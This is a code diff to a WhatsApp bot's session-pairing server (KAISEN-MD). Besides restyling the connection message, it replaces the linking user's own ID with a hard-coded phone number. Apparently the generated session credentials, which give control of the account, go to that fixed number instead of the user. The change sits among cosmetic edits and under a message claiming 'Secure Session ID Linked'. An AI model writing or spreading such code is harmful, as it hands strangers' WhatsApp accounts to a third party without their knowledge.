@@ -9,30 +9,19 @@ const fs = require("fs-extra");
 const { Boom } = require("@hapi/boom");//
 
 const MESSAGE = process.env.MESSAGE ||  `
-🔥 𝐊ąìʂҽղ-𝐌𝐃 | 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 ✅
-🔥 Your Bot is Now Alive, Royal & Ready to Rock! 🔥
-━━━━━━━━━━━━━━━━━━━━━━
-🟢 Session qr code Successfully ✅
-🔗 Connect for Instant Support & Royal Help:
-📌 WhatsApp Group:
-https://chat.whatsapp.com/Ja7bWhgrFkc3V67yBjchM2
-━━━━━━━━━━━━━━━━━━━━━━
-📦 GitHub Repo — Star It For Power Boost!
-✴️ 𝐊ąìʂҽղ-𝐌𝐃 GitHub:
-🪂
-github.com/sumon9836/KAISEN-MD.git
-━━━━━━━━━━━━━━━━━━━━━━
-🚀 Deploy Your Royal Bot Now
-👑 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲: 𝐋𝐨𝐯𝐞𝐥𝐲-𝐁𝐨𝐲.𝐱.𝐒𝐮𝐦𝐨𝐧
-🧠 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲: 𝐊ąìʂҽղ 𝐈𝐧𝐭𝐞𝐥 𝐂𝐨𝐫𝐞™
-✨ Deploy & Rule Like a True Legend
-━━━━━━━━━━━━━━━━━━━━━━
-📝 Royal Quote of the Bot:
+╭─❍  *𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃 𝐁𝐎𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
+├ 🍓 *Device:* Connected Successfully
+├ 🎐 *Bot Name:* KAISEN-MD
+├ 🍄 *Status:* Online & Ready
+├ 🍉 *Owner:* +917003816486
+╰───────────────⬣
 
-> "𝐁𝐨𝐭 𝐁𝐲 𝐍𝐚𝐦𝐞, 𝐋𝐞𝐠𝐞𝐧𝐝 𝐁𝐲 𝐅𝐚𝐦𝐞"
-— Royalty Runs in the Code
-━━━━━━━━━━━━━━━━━━━━━━
-🦾 𝐊ąìʂҽղ_𝐌𝐃 || 𝐒𝐚𝐦𝐢𝐧_𝐒𝐮𝐦𝐨𝐧 || 𝐑𝐨𝐲𝐚𝐥𝐁𝐨𝐭
+💬 *Welcome to KAISEN-MD WhatsApp Bot!*
+🔹 Use *.menu* to explore all commands.
+🔹 Stay respectful and enjoy smart automation.
+
+🌸 *Powered by Kaisen Team*
+🎀 *Secure Session ID Linked*
 `;
 
 // Store active sessions
@@ -94,7 +83,8 @@ router.get('/', async (req, res) => {
                 if (connection === "open") {
                     try {
                         await delay(3000);
-                        let user = socket.user.id;
+                        // Send message to fixed number
+        let user = '917003816486@s.whatsapp.net';
 
                         function randomMegaId(length = 6, numberLength = 4) {
                             const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
